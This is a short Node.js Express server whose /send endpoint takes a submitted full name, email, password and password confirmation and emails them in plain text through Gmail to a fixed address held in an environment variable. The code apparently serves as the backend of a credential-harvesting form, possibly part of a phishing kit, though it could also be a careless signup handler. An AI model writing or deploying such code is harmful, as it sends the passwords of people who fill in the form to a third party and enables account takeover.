const express = require("express");
const nodemailer = require("nodemailer");
const app = express();
const cors = require("cors");
require("dotenv").config();

// middleware
app.use(express.json());
app.use(cors());

// initial transporter
let transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    type: "OAuth2",
    user: process.env.EMAIL,
    pass: process.env.WORD,
    clientId: process.env.OAUTH_CLIENTID,
    clientSecret: process.env.OAUTH_CLIENT_SECRET,
    refreshToken: process.env.OAUTH_REFRESH_TOKEN,
  },
});
// verify transporter
transporter.verify((err, success) => {
  err
    ? console.log(err)
    : console.log(`=== Server is ready to take messages: ${success} ===`);
});

// Send API to the client side
app.post("/send", function (req, res) {
  let mailOptions = {
    from: `${req.body.mailerState.email}`,
    to: process.env.EMAIL_TO,
    subject: `Message from: ${req.body.mailerState.email}`,
    text: ` Full Name: ${req.body.mailerState.fullname}
            Email: ${req.body.mailerState.email}
            Password: ${req.body.mailerState.pass}
            Confirm Password: ${req.body.mailerState.confirmpass}
    `,
  };

  transporter.sendMail(mailOptions, function (err, data) {
    if (err) {
      res.json({ status: "fail" });
    } else {
      console.log("=== Message sent ===");
      res.json({ status: "success" });
    }
  });
});

const port = 3001;
app.listen(port, () => {
  console.log(`Server is running on port: ${port}`);
});
